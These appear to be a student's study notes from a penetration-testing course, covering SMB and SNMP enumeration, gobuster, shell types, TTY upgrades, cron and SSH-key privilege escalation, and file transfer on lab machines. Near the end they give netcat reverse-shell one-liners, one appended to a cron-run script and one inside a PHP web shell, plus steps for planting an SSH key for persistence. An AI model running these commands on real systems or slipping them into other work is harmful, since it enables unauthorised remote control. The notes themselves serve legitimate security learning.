
Since I was already familiar with tools such as `nmap`, `netcat (nc)`, `SSH`, and `FTP`, I did not focus much on those areas during this module. Instead, I mainly explored newer enumeration concepts and services that I had not worked with deeply before.

One of the first things I learned was using nmap's scipting to 
find os information..

``` bash
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```


Then comes SMB enumeration. SMB (Server Message Block) is a protocol commonly used in Windows environments that allows users and administrators to share folders and files over a network.

```bash
smbclient -N -L \\\\10.129.42.253
```

Here, the `-N` flag performs null authentication without a password, while `-L` lists the available shares on the target system.

I also learned how to connect directly to a shared folder using valid credentials:

```bash
smbclient -U bob \\\\10.129.42.253\\users
```


Another important topic covered in this module was SNMP enumeration. SNMP (Simple Network Management Protocol) is used for monitoring and managing network devices, but insecure configurations can leak valuable system information during enumeration.

```bash
snmpwalk -v 2c -c private 10.129.42.253
```

In this command:
- `-v 2c` specifies SNMP version 2c
- `-c private` sets the community string used for authentication

If the correct community string is provided, the service may reveal useful information about the target machine, users, processes, or network configuration.

I also learned that SNMP community strings are often weak or left as default values, making them vulnerable to brute force attacks. A tool called `onesixtyone` can be used to automate this process.

```bash
onesixtyone -c dict.txt 10.129.42.254
```

This command uses a wordlist (`dict.txt`) to test possible SNMP community strings against the target host.

## tmux

I also learned about `tmux`, a terminal multiplexer that allows multiple terminal sessions to run within a single window. 

Some useful `tmux` capabilities include:
- Splitting terminals into panes
- Managing multiple sessions
- Detaching and reattaching sessions
- Keeping long-running processes active even after disconnecting

## For Web Enumeration

It is advised to go through these first:

[Common Ports Cheat Sheet: The Ultimate List](https://www.stationx.net/common-ports-cheat-sheet/)
[List of HTTP status codes - Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)

# Gobuster DNS vs DIR

gobuster dir: Used for directory and file brute forcing on a web server.

Example:

```bash
gobuster dir -u http://example.com -w wordlist.txt
```

Finds paths like:

```text
/example
/admin
/login
/uploads
```

Used for:
- hidden directories
- admin panels
- backup files
- APIs

---

gobuster dns: Used for subdomain brute forcing.

Example:

```bash
gobuster dns -d example.com -w wordlist.txt
```

Finds subdomains like:

```text
admin.example.com
dev.example.com
mail.example.com
```

Used for:
- discovering subdomains
- identifying dev/staging servers
- expanding attack surface

---

**Main Difference** 

- `gobuster dir` → brute forces web paths
- `gobuster dns` → brute forces subdomains

### Additional Enumeration Tools

## EyeWitness

`EyeWitness` is used to:
- take screenshots of web applications
- fingerprint technologies
- identify possible default credentials

Useful for quickly reviewing multiple targets during reconnaissance.

---

## SecLists

`SecLists` is a large collection of:
- wordlists
- usernames
- passwords
- payloads
- fuzzing lists

Commonly used with tools like:
- gobuster
- ffuf
- hydra
- burpsuite

---

## curl

`curl` is used to interact with web servers directly from the terminal.

Example:

```bash
curl http://10.10.10.5
```

Useful for:
- viewing raw responses
- testing headers
- interacting with APIs
- debugging web requests

---

## whatweb

`whatweb` fingerprints web technologies used by a target website.

Example:

```bash
whatweb 10.10.10.5
```

Can identify:
- CMS
- frameworks
- server versions
- technologies
- plugins


```bash
whatweb --no-errors 10.10.10.0/24
```

### Breakdown
- `--no-errors` → suppresses connection errors
- `/24` → scans the entire subnet

Useful for quickly fingerprinting multiple web servers in a network range.

#### Important  

Check for versions for any service used and find exploits for that one online, if available, use **METASPLOIT** to crack it, which you will go through in **section 9 of GETTING  STARTED module**...  

## Section 10: 3 types of shell

| `Reverse Shell` | Connects back to our system and gives us control through a reverse connection.                                                                                                                                                                                                              | bash: Available online                           | Powershell: available online                                                                                                                                        |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Bind Shell`    | Waits for us to connect to it and gives us control once we do.                                                                                                                                                                                                                              | bash: Available online                           | Powershell: available online                                                                                                                                        |
| `Web Shell`     | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. | Common short web shell scripts: Available online | Default Webroot Locations<br><br>- Apache → `/var/www/html/`<br>- Nginx → `/usr/local/nginx/html/`<br>- IIS → `C:\inetpub\wwwroot\`<br>- XAMPP → `C:\xampp\htdocs\` |

#### Upgrading TTY

A basic Netcat shell lacks features like command history, tab completion, and cursor movement. To get a fully interactive shell, the TTY can be upgraded using Python and `stty`.

Spawn a better shell with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then background the shell:

```bash
Ctrl + Z
```

Fix the terminal locally:

```bash
stty raw -echo
fg
```

Press `Enter` twice or type `reset` if needed.

To fix terminal sizing:

```bash
echo $TERM
stty size
```

Then set them on the remote shell:

```bash
export TERM=xterm-256color
stty rows 67 columns 318
```

This provides a much more stable and interactive shell experience similar to SSH.

## Section 11

Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).  server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

Check what commands are eligible to that user by sudo -l. Then,
[GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through 
[LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications.

`dpkg -l` command on Linux to see installed softwares.

## Scheduled Tasks

In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through `Cron Jobs`. There are specific directories that we may be able to utilize to add new cron jobs if we have the `write` permissions over them. These include:

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

---

## Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows).

# SSH Keys

If read access to a user's `.ssh` directory is obtained, private SSH keys such as `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa` can be used for authentication. First save that key on the machine. Then,

Example:

```bash
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa
```

`chmod 600` is required because SSH refuses to use keys with insecure permissions.

---

If write access to a user's `.ssh` directory is available, a public key can be added to `authorized_keys` for persistent SSH access.

Generate a key pair:

```bash
ssh-keygen -f key
```

Two keys will be generated. Add the public key to the target:

```bash
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

Then authenticate using the private key:

```bash
ssh root@10.10.10.10 -i key
```

## Section 12--> File Transfer Using Base64

```
scp linenum.sh user@remotehost:/tmp/linenum.sh

wget http://10.10.14.1:8000/linenum.sh
```

#### base64 
In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
noobjb@htb$ base64 shell -w 0

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:

user@remotehost$ echo the_code | base64 -d > shell



# Final sections

There will be two boxes hereto end this module.. One comes with the Nibble box + walkthrough and then another similar to that.
The things that worked here:
1. Keep enumerating, check for versions, directories, nmap, gobuster and all..... and look for available exploits online.
2. Reverse Engineering where you upload a script to gain remote access. (first i found the hole to upload my script, i deleted the whole existing code then added my script, but it didnt work. Then uploaded my php script on top of the existing script where applicable.)
3. For Privilege Escalation, go for sudo -l (or you can use (LineEnum.sh from online--> transfer it into the remote server (To this, first open ``` python -m http.server 8080```  in your device, and download the file using ```wget``` in the remote server)) to see permissions available, and then try to crack it. you either can go though GTFObins or simply Google it.

**To add the reverse shell in a file in remote server:**

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f' | tee -a monitor.sh

**one liner reverse shell:** 

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f"); ?>
 
 or check [Reverse Shell Cheat Sheet - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) 